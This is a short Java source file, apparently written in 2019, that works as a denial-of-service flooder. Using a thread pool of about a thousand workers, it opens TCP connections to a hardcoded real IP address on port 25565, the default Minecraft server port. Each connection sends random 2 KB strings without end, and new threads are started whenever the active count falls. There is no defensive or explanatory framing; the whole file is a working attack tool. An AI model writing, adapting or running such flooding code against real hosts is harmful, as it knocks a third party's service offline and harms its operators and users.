import org.apache.commons.lang3.RandomStringUtils;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * @author crt106 on 2019/8/10.
 */
class MainFuck {

    private static BlockingQueue blockingQueue = new ArrayBlockingQueue(1200);
    private static ThreadPoolExecutor t = new ThreadPoolExecutor(0, 1100, 500, TimeUnit.MILLISECONDS, blockingQueue);


    public static void main(String[] args) {
        Runnable r = () -> {
            Socket socket = null;
            OutputStream os = null;
            try {
                socket = new Socket("120.79.169.48", 25565);
                os = socket.getOutputStream();
            } catch (IOException e) {
                e.printStackTrace();
                return;
            }
            while (true) {
                try {
                    String str= RandomStringUtils.randomAlphanumeric(2048);
                    os.write(str.getBytes());
                    System.out.println("[" + Thread.currentThread().getId() + "] " + "do one");
                } catch (IOException e) {
                    return;
                }
            }
        };
        for (int i = 0; i < 1000; i++) {
            t.execute(r);
        }
        while (true) {
            if (t.getActiveCount() < 910) {
                for (int i = 0; i < 90; i++) {
                    t.execute(r);
                }
            }
        }
    }

}
